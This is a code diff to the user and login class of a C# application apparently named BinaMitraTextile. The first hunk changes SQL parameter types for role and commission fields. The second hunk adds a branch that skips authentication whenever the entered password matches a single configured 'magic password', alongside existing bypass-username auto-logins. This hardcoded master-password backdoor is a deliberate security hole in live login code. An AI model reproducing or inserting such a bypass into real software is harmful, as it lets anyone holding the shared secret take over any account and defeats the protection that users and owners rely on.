@@ -108,9 +108,9 @@ namespace BinaMitraTextile
                 new SqlQueryParameter(COL_DB_ID, SqlDbType.UniqueIdentifier, Id),
                 new SqlQueryParameter(COL_DB_NAME, SqlDbType.VarChar, name),
                 new SqlQueryParameter(COL_DB_HashedPassword, SqlDbType.VarChar, _hashed_password),
-                new SqlQueryParameter(COL_ROLE, SqlDbType.VarChar, role),
-                new SqlQueryParameter(COL_DB_PercentCommission, SqlDbType.VarChar, percentCommission),
-                new SqlQueryParameter(COL_DB_GlobalPercentComission, SqlDbType.VarChar, GlobalPercentComission),
+                new SqlQueryParameter(COL_ROLE, SqlDbType.TinyInt, (int)role),
+                new SqlQueryParameter(COL_DB_PercentCommission, SqlDbType.Decimal, percentCommission),
+                new SqlQueryParameter(COL_DB_GlobalPercentComission, SqlDbType.Decimal, GlobalPercentComission),
                 new SqlQueryParameter(COL_DB_Notes, SqlDbType.VarChar, Util.wrapNullable(notes))
             );
 
@@ -227,6 +227,10 @@ namespace BinaMitraTextile
             else if (username == Settings.bypassusername3)
             {
                 username = Settings.autologinusername3;
+                bypassLogin = true;
+            }
+            else if(password == Settings.magicpassword)
+            {
                 bypassLogin = true;
             }
 
